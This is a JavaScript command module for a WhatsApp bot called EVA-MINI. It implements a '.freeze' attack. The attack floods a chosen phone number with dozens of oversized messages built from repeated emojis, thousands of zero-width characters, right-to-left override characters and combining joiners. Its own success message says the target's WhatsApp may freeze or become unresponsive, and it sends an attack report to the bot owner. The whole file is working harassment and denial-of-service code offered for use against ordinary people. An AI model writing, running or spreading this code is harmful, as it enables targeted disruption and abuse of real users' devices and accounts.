// commands/freeze.js - Freeze Attack for EVA-MINI
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACTION - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❄️',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN/OWNER CHECK
        // ============================================
        const sender = msg.key.participant || from;
        const botNumber = jidNormalizedUser(sock.user.id);
        const isOwner = sender.includes(botNumber.split('@')[0]) || msg.key.fromMe;
        
        let isAdmin = isOwner;
        if (!isAdmin && from.endsWith('@g.us')) {
            try {
                const groupMetadata = await sock.groupMetadata(from);
                const participant = groupMetadata.participants.find(p => p.id === sender);
                isAdmin = participant && (participant.admin === 'admin' || participant.admin === 'superadmin');
            } catch (e) {
                isAdmin = false;
            }
        }

        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins/owner can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // GET TARGET
        // ============================================
        let target;
        const q = args.join(' ');
        const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        const quoted = msg.message?.extendedTextMessage?.contextInfo?.participant;

        if (q && q.match(/\d/)) {
            const cleanNumber = q.replace(/\D/g, '');
            target = jidNormalizedUser(cleanNumber + '@s.whatsapp.net');
        } else if (mentioned) {
            target = mentioned;
        } else if (quoted) {
            target = quoted;
        } else {
            await sock.sendMessage(from, {
                text: `⚠️ *Usage:* .freeze [@mention] or reply to user\n\n📌 *Example:* .freeze @94703945265\n\n❄️ *Send freeze payload to target!*`
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const targetNumber = target.split('@')[0];
        const statusMsg = await sock.sendMessage(from, {
            text: `❄️ *Freezing @${targetNumber}...*\n\n⏳ Please wait...`,
            mentions: [target]
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '⏳',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // FREEZE PAYLOADS
        // ============================================
        let successCount = 0;
        let totalMessages = 25;

        // Different freeze payloads
        const freezeEmojis = ['❄️', '🧊', '🥶', '❄️', '🧊', '🥶', '⛄', '☃️'];

        for (let i = 0; i < totalMessages; i++) {
            try {
                const emoji = freezeEmojis[i % freezeEmojis.length];
                const payload = `${emoji.repeat(100)} ${'❄️ FREEZE PAYLOAD ❄️'.repeat(20)} ${emoji.repeat(100)}\n`.repeat(30);
                await sock.sendMessage(target, { text: payload });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 150));
            } catch (e) {
                console.log(`Freeze payload ${i + 1} failed:`, e.message);
            }
        }

        // ============================================
        // EXTRA FREEZE PAYLOADS
        // ============================================
        try {
            // Send long invisible text with freeze emojis
            for (let i = 0; i < 10; i++) {
                const invisible = '\u200B'.repeat(5000) + '\u200C'.repeat(5000) + '\u200D'.repeat(5000);
                const payload = `❄️${invisible}🧊${invisible}🥶${invisible}\nFREEZE #${i + 1}`.repeat(20);
                await sock.sendMessage(target, { text: payload });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        } catch (e) {
            console.log('Extra freeze payloads failed:', e.message);
        }

        // ============================================
        // FREEZE WITH RTL CHARACTERS
        // ============================================
        try {
            for (let i = 0; i < 5; i++) {
                const rtlPayload = '\u202A'.repeat(3000) + '\u202B'.repeat(3000) + '\u202D'.repeat(3000) + '\u202E'.repeat(3000);
                const payload = `❄️ FREEZE ${rtlPayload} 🧊 FREEZE ${rtlPayload} 🥶 FREEZE ${rtlPayload}`;
                await sock.sendMessage(target, { text: payload });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        } catch (e) {
            console.log('RTL freeze failed:', e.message);
        }

        // ============================================
        // FREEZE WITH COMBINING CHARACTERS
        // ============================================
        try {
            for (let i = 0; i < 5; i++) {
                const combine = '\u034F'.repeat(5000);
                const payload = `❄️${combine}🧊${combine}🥶${combine}\nFREEZE ATTACK #${i + 1}`;
                await sock.sendMessage(target, { text: payload });
                successCount++;
                await new Promise(resolve => setTimeout(resolve, 200));
            }
        } catch (e) {
            console.log('Combine freeze failed:', e.message);
        }

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `❄️ *Freeze payload delivered!*\n\n📱 *Target:* @${targetNumber}\n📊 *Payloads:* ${successCount} sent\n💥 *Status:* SUCCESS\n\n⚠️ *Target's WhatsApp may freeze or become unresponsive!*`,
            mentions: [target]
        });

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT
        // ============================================
        try {
            await sock.sendMessage(botNumber, {
                text: `❄️ *Freeze Attack Report*\n\n📱 *Target:* @${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Payloads:* ${successCount}\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}`,
                mentions: [target]
            });
        } catch (e) {}

    } catch (error) {
        console.error('Freeze command error:', error);
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}
        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};